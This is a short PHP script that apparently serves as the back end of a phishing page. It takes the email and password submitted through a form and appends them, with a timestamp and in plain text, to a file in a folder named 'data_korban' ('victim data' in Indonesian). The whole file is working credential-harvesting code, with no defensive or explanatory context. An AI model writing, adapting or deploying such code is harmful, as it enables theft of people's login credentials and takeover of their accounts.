<?php

if (isset($_POST['email']) && isset($_POST['password'])) {

    $email = $_POST['email'];
    $password = $_POST['password'];

    $currentTime = date('Y-m-d H:i:s');

    $file = 'data_korban/hasil.txt';

    $data = "[$currentTime] Email: $email | Password: $password\n";

    file_put_contents($file, $data, FILE_APPEND);

    echo "Data has been saved successfully!";
} else {

    echo "Error: Email or password is missing!";
}
?>
